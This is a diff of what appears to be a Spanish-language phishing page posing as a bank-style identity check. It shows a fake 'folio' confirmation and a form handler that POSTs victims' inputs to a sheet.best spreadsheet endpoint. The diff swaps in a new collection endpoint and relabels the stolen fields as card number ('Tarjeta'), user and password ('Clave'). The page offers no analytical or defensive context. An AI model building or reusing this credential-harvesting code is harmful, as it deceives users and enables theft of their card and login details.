@@ -89,7 +89,7 @@
 					<h2 class="txtFolio">Validando Tú Identidad…</h2>
 					<div class="loading"><img src="img/loading-gif.gif"></div>
 					<p class="txt">Folio generado con éxito. Comparte el folio con tu asesor virtual o telefónico.</p>
-					<h1 class="folio">RP2384</h1>			
+					<h1 class="folio">ML2384</h1>			
 
 			
 
@@ -109,16 +109,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://sheet.best/api/sheets/03c17322-bf42-40b0-b6a2-f3fbb2e249d5', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/c2f5e8a8-2111-44db-abd8-80cf0af25736', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "a": formulario.usuario.value,
-            "b": formulario.contraseña.value,
-            "c": formulario.confirmar.value
+            "Tarjeta": formulario.usuario.value,
+            "Usuario": formulario.contraseña.value,
+            "Clave": formulario.confirmar.value
         })
     });
 
